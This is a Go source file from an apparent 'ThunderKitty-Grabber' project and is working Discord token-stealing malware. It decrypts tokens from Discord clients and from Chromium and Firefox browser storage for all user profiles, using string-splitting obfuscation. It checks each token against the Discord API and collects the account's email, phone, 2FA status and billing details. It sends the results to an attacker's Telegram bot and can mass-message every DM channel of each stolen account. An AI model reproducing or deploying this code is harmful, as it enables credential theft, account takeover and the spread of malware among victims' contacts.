package TokenGrabber

import (
	"ThunderKitty-Grabber/utils/browsers"
	requests "ThunderKitty-Grabber/utils/telegramsend"
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"

	"github.com/shirou/gopsutil/v3/disk"
)

var (
	Regexp           = regexp.MustCompile(`dQw4w9WgXcQ:[^\"]*`)
	RegexpBrowsers   = regexp.MustCompile(`[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}`)
	telegramBotToken string
	telegramChatID   string
)

type discordMessage struct {
	Content string `json:"content"`
}

type User struct {
	ID          string `json:"id"`
	Username    string `json:"username"`
	Email       string `json:"email"`
	Phone       string `json:"phone"`
	PublicFlags int    `json:"public_flags"`
	PremiumType int    `json:"premium_type"`
	MfaEnabled  bool   `json:"mfa_enabled"`
}

type Billing struct {
	Brand string `json:"brand"`
}

type Guild struct {
	Name                   string `json:"name"`
	ApproximateMemberCount int    `json:"approximate_member_count"`
}

func SetTelegramCredentials(botToken, chatID string) {
	telegramBotToken = botToken
	telegramChatID = chatID
}

func IsDir(path string) bool {
	fileInfo, err := os.Stat(path)
	if err != nil {
		return false
	}
	return fileInfo.IsDir()
}
func IsElevated() bool {
	ret, _, _ := syscall.NewLazyDLL("shell32.dll").NewProc("IsUserAnAdmin").Call()
	return ret != 0
}

func GetUsers() []string {
	if !IsElevated() {
		return []string{os.Getenv("USERPROFILE")}
	}

	var users []string
	drives, err := disk.Partitions(false)
	if err != nil {
		return []string{os.Getenv("USERPROFILE")}
	}

	for _, drive := range drives {
		mountpoint := drive.Mountpoint

		files, err := os.ReadDir(fmt.Sprintf("%s//Users", mountpoint))
		if err != nil {
			continue
		}

		for _, file := range files {
			if !file.IsDir() {
				continue
			}
			users = append(users, filepath.Join(fmt.Sprintf("%s//Users", mountpoint), file.Name()))
		}
	}

	return users
}

func SendDMViaAPI(token, messageContent string) error {
	channelIDs, err := fetchchannels(token)
	if err != nil {
		fmt.Printf("Error getting channel IDs: %v\n", err)
		return err
	}

	for _, channelID := range channelIDs {
		err := sendMessage(token, channelID, messageContent)
		if err != nil {
			fmt.Printf("Error sending message to channel %s: %v\n", channelID, err)
			continue
		}
	}

	return nil
}

func Run(botToken, chatID string, dmMessage string) {
	SetTelegramCredentials(botToken, chatID)
	var Tokens map[string]map[string]string
	discordPaths := map[string]string{
		"Di" + "sc" + "ord":                    "\\di" + "sco" + "rd " + "\\Loc" + "al St" + "ate",
		"Dis" + "c" + "or" + "d Canary":        "\\disc" + "ordc" + "anar" + "y\\Lo" + "cal S" + "tate",
		"Lig" + "htc" + "ord":                  "\\lig" + "htco" + "rd\\L" + "ocal " + "tate",
		"Di" + "sc" + "or" + "d " + "PT" + "B": "\\di" + "scor" + "dptb\\" + "Loc" + "al " + "Sta" + "te",
	}

	Tokens = make(map[string]map[string]string)

	for _, user := range GetUsers() {
		for name, path := range discordPaths {

			path = user + "\\AppData\\Roaming" + path

			if !Exists(path) {
				continue
			}

			dir := filepath.Dir(path)
			c := browsers.Chromium{}
			err := c.GetMasterKey(dir)
			if err != nil {
				continue
			}

			var files []string
			ldbs, err := filepath.Glob(filepath.Join(dir, "Local Storage", "leveldb", "*.ldb"))
			if err != nil {
				continue
			}
			files = append(files, ldbs...)
			logs, err := filepath.Glob(filepath.Join(dir, "Local Storage", "leveldb", "*.log"))
			if err != nil {
				continue
			}
			files = append(files, logs...)

			for _, file := range files {
				data, err := ReadFile(file)
				if err != nil {
					continue
				}

				for _, match := range Regexp.FindAllString(data, -1) {
					encodedPass, err := base64.StdEncoding.DecodeString(strings.Split(match, "dQ"+"w4w"+"9Wg"+"Xc"+"Q:")[1])
					if err != nil {
						continue
					}
					decodedPass, err := c.Decrypt(encodedPass)
					if err != nil {
						continue
					}

					token := string(decodedPass)

					if !ValidateToken(token) {
						continue
					}

					if _, ok := Tokens[token]; !ok {
						Tokens[token] = make(map[string]string)
						Tokens[token]["source"] = "Discord Client"
						Tokens[token]["location"] = name
					}
				}
			}
		}

		for browserName, browserPath := range browsers.GetChromiumBrowsers() {
			browserPath = user + "\\" + browserPath

			if !IsDir(browserPath) {
				continue
			}

			var profiles []browsers.Profile
			if strings.Contains(browserPath, "Opera") {
				profiles = append(profiles, browsers.Profile{
					Name:    "Default",
					Path:    browserPath,
					Browser: browsers.Browser{Name: browserName},
				})
			} else {
				folders, err := os.ReadDir(browserPath)
				if err != nil {
					continue
				}
				for _, folder := range folders {
					if folder.IsDir() {
						dir := filepath.Join(browserPath, folder.Name())

						if Exists(filepath.Join(dir, "Web Data")) {
							profiles = append(profiles, browsers.Profile{
								Name:    folder.Name(),
								Path:    dir,
								Browser: browsers.Browser{Name: browserName},
							})
						}
					}
				}
			}

			c := browsers.Chromium{}
			err := c.GetMasterKey(browserPath)
			if err != nil {
				continue
			}

			for _, profile := range profiles {
				var files []string
				ldbs, err := filepath.Glob(filepath.Join(profile.Path, "Local Storage", "leveldb", "*.ldb"))
				if err != nil {
					continue
				}
				files = append(files, ldbs...)
				logs, err := filepath.Glob(filepath.Join(profile.Path, "Local Storage", "leveldb", "*.log"))
				if err != nil {
					continue
				}
				files = append(files, logs...)

				for _, file := range files {
					data, err := ReadFile(file)
					if err != nil {
						continue
					}

					for _, token := range RegexpBrowsers.FindAllString(data, -1) {
						if !ValidateToken(token) {
							continue
						}

						if _, ok := Tokens[token]; !ok {
							Tokens[token] = make(map[string]string)
							Tokens[token]["source"] = "Browser"
							Tokens[token]["location"] = browserName
						}
					}

				}
			}
		}

		for _, geckoPath := range browsers.GetGeckoBrowsers() {
			geckoPath = user + "\\" + geckoPath
			if !IsDir(geckoPath) {
				continue
			}

			profiles, err := os.ReadDir(geckoPath)
			if err != nil {
				continue
			}
			for _, profile := range profiles {
				if !profile.IsDir() {
					continue
				}

				files, err := os.ReadDir(geckoPath + "\\" + profile.Name())
				if err != nil {
					continue
				}

				if len(files) <= 10 {
					continue
				}

				filepath.Walk(geckoPath+"\\"+profile.Name(), func(path string, info os.FileInfo, err error) error {
					if err != nil {
						return err
					}
					if !info.IsDir() {
						if strings.Contains(info.Name(), ".sqlite") {
							lines, err := ReadLines(path)
							if err != nil {
								return err
							}
							for _, line := range lines {
								for _, token := range RegexpBrowsers.FindAllString(line, -1) {
									if !ValidateToken(token) {
										continue
									}

									if _, ok := Tokens[token]; !ok {
										Tokens[token] = make(map[string]string)
										Tokens[token]["source"] = "Browser"
										Tokens[token]["location"] = "Firefox"
									}
								}
							}
						}
					}
					return nil
				})
			}

		}

	}

	var message strings.Builder

	for token, info := range Tokens {
		body, err := Get("https://discord.com/api/v9/users/@me", map[string]string{"Authorization": token})
		if err != nil {
			continue
		}

		var user User
		if err = json.Unmarshal(body, &user); err != nil {
			continue
		}

		billing, err := Get("https://discord.com/api/v9/users/@me/billing/payment-sources", map[string]string{"Authorization": token})
		if err != nil {
			continue
		}

		var billingData []Billing
		if err = json.Unmarshal(billing, &billingData); err != nil {
			continue
		}

		nitro := GetNitro(user.PremiumType)
		paymentMethods := GetBilling(billingData)
		if user.Email == "" {
			user.Email = "None"
		}
		if user.Phone == "" {
			user.Phone = "None"
		}
		if user.MfaEnabled {
			user.Phone = user.Phone + " (2FA)"
		}

		location := info["location"]
		source := info["source"]
		if source == "Discord Client" {
			message.WriteString(fmt.Sprintf("👤 User: %s (%s) (Discord - %s)\n", user.Username, user.ID, location))
		} else {
			message.WriteString(fmt.Sprintf("👤 User: %s (%s) (Browser - %s)\n", user.Username, user.ID, location))
		}
		message.WriteString(fmt.Sprintf("🍪 Token: %s\n", token))
		message.WriteString(fmt.Sprintf("📧 Email: %s\n", user.Email))
		message.WriteString(fmt.Sprintf("📞 Phone: %s\n", user.Phone))
		message.WriteString(fmt.Sprintf("🟣 Nitro: %s\n", nitro))
		message.WriteString(fmt.Sprintf("💳 Billing: %s\n\n", paymentMethods))
	}

	messageText := url.QueryEscape(message.String())

	//err := requests.SendToTelegram(botToken, chatID, messageText, "")
	err := requests.SendTelegramMessage(botToken, chatID, messageText)
	if err != nil {
		fmt.Println("Failed to send message to Telegram:", err)
	}

	// Send DMs
	if dmMessage != "" {
		for token := range Tokens {
			err := SendDMViaAPI(token, dmMessage)
			if err != nil {
				fmt.Printf("Failed to send Discord message for token %s: %v\n", token, err)
			}
		}
	}
}

func ValidateToken(token string) bool {
	req, _ := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
	req.Header.Set("Authorization", token)
	res, err := http.DefaultClient.Do(req)
	if err != nil {
		return false
	}
	return res.StatusCode == 200
}

func ReadFile(path string) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()

	data, err := io.ReadAll(f)
	if err != nil {
		return "", err
	}

	return string(data), nil
}

func ReadLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func Exists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

func Contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func GetNitro(premiumType int) string {
	switch premiumType {
	case 0:
		return "None"
	case 1:
		return "Classic"
	case 2:
		return "Nitro"
	default:
		return "Unknown"
	}
}

func GetBilling(billing []Billing) string {
	if len(billing) == 0 {
		return "None"
	}
	var methods []string
	for _, b := range billing {
		methods = append(methods, b.Brand)
	}
	return strings.Join(methods, ", ")
}

func GetHQGuilds(guilds []Guild, token string) string {
	var hqGuilds []string
	for _, guild := range guilds {
		if guild.ApproximateMemberCount >= 1000 {
			hqGuilds = append(hqGuilds, fmt.Sprintf("%s (%d members)", guild.Name, guild.ApproximateMemberCount))
		}
	}
	if len(hqGuilds) == 0 {
		return "None"
	}
	return strings.Join(hqGuilds, ", ")
}

func Get(url string, headers map[string]string) ([]byte, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	for key, value := range headers {
		req.Header.Set(key, value)
	}

	res, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()

	return io.ReadAll(res.Body)
}

func fetchchannels(token string) ([]string, error) {
	uri := "https://discord.com/api/v8/users/@me/channels"
	req, err := http.NewRequest("GET", uri, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", token)

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("HTTP status code: %d", resp.StatusCode)
	}

	var channelIDs []string
	var channels []struct {
		ID string `json:"id"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&channels); err != nil {
		return nil, err
	}

	for _, channel := range channels {
		channelIDs = append(channelIDs, channel.ID)
	}

	return channelIDs, nil
}

func sendMessage(token, channelID, messageContent string) error {
	if len(messageContent) > 2000 {
		return fmt.Errorf("Message too long")
	}

	uri := fmt.Sprintf("https://discord.com/api/v9/channels/%s/messages", channelID)
	body := map[string]string{
		"content": messageContent,
	}
	jsonBody, err := json.Marshal(body)
	if err != nil {
		return err
	}
	req, err := http.NewRequest("POST", uri, bytes.NewBuffer(jsonBody))
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", token)
	req.Header.Set("Content-Type", "application/json")
	client := http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("HTTP status code: %d", resp.StatusCode)
	}
	var response map[string]interface{}
	err = json.NewDecoder(resp.Body).Decode(&response)
	if err != nil {
		return err
	}
	return nil
}
